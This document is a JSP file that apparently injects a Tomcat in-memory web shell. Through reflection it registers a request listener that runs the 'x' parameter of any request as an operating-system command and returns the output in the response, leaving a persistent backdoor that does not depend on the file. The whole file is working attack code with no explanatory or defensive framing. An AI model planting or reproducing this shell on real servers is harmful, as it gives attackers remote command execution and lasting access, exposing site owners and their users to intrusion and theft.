<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="com.tomcat.util.ClassUtil" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="org.apache.catalina.connector.Request" %>

<%
try {
    ServletContext servletContext = request.getSession().getServletContext();
    Field servletfield = servletContext.getClass().getDeclaredField("context");
    servletfield.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) servletfield.get(servletContext);
    Field contextfield = applicationContext.getClass().getDeclaredField("context");
    contextfield.setAccessible(true);
    StandardContext standardContext = (StandardContext) contextfield.get(applicationContext);

    ServletRequestListener listener = new ServletRequestListener() {
        @Override
        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
            try {
                if (servletRequestEvent.getServletRequest().getParameter("x") != null) {
                    Process process = Runtime.getRuntime().exec(servletRequestEvent.getServletRequest().getParameter("x"));
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));

                    String str;
                    String line;
                    for(str = ""; (line = reader.readLine()) != null; str = str + line) {
                    }

                    HttpServletRequest request = (HttpServletRequest)servletRequestEvent.getServletRequest();
                    Field requestfield = request.getClass().getDeclaredField("request");
                    requestfield.setAccessible(true);
                    Request req = (Request)requestfield.get(request);
                    req.getResponse().getWriter().println(str);
                }
            } catch (Exception var9) {
                var9.printStackTrace();
            }
        }

        @Override
        public void requestInitialized(ServletRequestEvent servletRequestEvent) {

        }
    };

    standardContext.addApplicationEventListener(listener);

    out.println("tomcat listener added");
}catch (Exception e){
    e.printStackTrace();
}
%>
